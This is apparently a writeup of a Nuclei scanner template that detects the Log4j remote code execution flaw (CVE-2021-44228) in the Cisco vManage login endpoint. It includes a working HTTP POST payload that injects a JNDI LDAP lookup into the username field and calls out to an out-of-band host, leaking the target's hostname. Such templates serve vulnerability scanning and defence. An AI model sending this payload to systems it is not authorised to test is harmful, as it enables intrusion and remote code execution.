# Nuclei Template: Cisco vManage (Log4j) - Remote Code Execution
**Template ID:** cisco-vmanage-log4j-rce
**Vulnerability Class:** Command Injection - Generic
**Severity:** Critical
**CWE:** CWE-77
**Source:** Nuclei Template (`cisco-vmanage-log4j-rce.yaml`)

## Vulnerability Information & PoC

## Description
Cisco vManage is susceptible to remote code execution via the Apache Log4j framework. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials. More information is available in the cisco-sa-apache-log4j-qRuKNEbd advisory.

## Steps to reproduce / Exploit Payload
```http
@timeout: 20s
POST /j_security_check HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Origin: {{BaseURL}}
Referer: {{BaseURL}}

j_username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}}&j_password=admin&submit=Log+In
```

## References
- https://www.tenable.com/plugins/nessus/161212
- https://logging.apache.org/log4j/2.x/security.html
- https://nvd.nist.gov/vuln/detail/CVE-2021-44228
